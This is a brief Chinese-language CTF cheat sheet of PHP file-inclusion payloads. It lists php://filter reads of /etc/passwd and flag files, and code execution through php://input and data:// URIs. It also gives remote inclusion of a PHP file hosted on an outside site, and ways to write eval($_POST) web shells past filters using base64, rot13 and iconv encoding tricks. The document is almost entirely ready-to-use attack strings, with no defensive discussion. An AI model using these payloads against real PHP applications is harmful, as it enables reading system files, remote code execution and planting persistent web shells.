# CTF

#### 文件包含

```
file:///etc/passwd
php://filter/read=convert.base64-encode/resource=phpinfo.php
php://filter/read=convert.base64-encode/resource=flag.php
php://input post:<?php system('tac flag.php');?>
file=http://www.xiaodi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
data://text/plain,<?=system('tac flag.*');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
php://filter/convert.iconv.utf-8.utf-16/resource=flag.php
php://filter/convert.iconv.utf-8.utf-8/resource=/etc/passwd

利用base64
php://filter/write=convert.base64-decode/resource=123.php
content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
<?php @eval($_POST[a]);?>

利用凯撒13：
url编码2次：php://filter/write=string.rot13/resource=2.php
POST发送数据：content=<?cuc riny($_CBFG[1]);?>

data&base64协议:
过滤PHP，各种符号，php代码编码写出无符号base64值
Payload：file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk

php://filter/write&新的算法
convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用
<?php
$result = iconv("UCS-2LE","UCS-2BE", '<?php eval($_POST[a]);?>');
echo "经过一次反转:".$result."\n";
echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);
?>
Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
contents=?<hp pvela$(P_SO[T]a;)>?
```

